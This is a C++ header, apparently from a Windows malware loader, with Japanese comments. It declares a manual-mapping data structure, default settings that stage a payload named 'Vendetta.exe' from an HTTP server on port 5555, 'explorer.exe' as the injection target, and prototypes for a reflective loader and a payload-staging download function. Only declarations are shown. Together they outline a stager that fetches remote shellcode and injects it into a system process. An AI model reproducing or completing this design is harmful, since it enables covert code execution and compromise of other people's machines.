#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <Windows.h>
#include<TlHelp32.h>
#include <wininet.h>

#include <iostream>
#include <fstream>
#include <string>
#include <algorithm>
#include <vector>

#pragma comment(lib, "wininet.lib")

using f_LoadLibraryA = HINSTANCE(WINAPI*)(LPCSTR lpLibFilename);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(LPVOID hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

struct MANUAL_MAPPING_DATA
{
    f_LoadLibraryA pLoadLibraryA;
    f_GetProcAddress pGetProcAddress;
    PBYTE pBase;
    DWORD fdwReasonParam;
    LPVOID reservedParam;
};

struct Arg {
    // URLのパーツ
    wchar_t protocol[255] = L"http://";
    wchar_t ipAddress[255] = L"127.0.0.1";
    wchar_t port[255] = L"5555";
    wchar_t filePath[255] = L"Vendetta.exe";

    // ターゲットプロセス名
    wchar_t targetProcessName[255] = L"explorer.exe";
};



std::wstring makeUrl(const Arg& arg);
bool GetProcessIdToProcessName(std::wstring processName, DWORD& processId);
void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData);
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode);
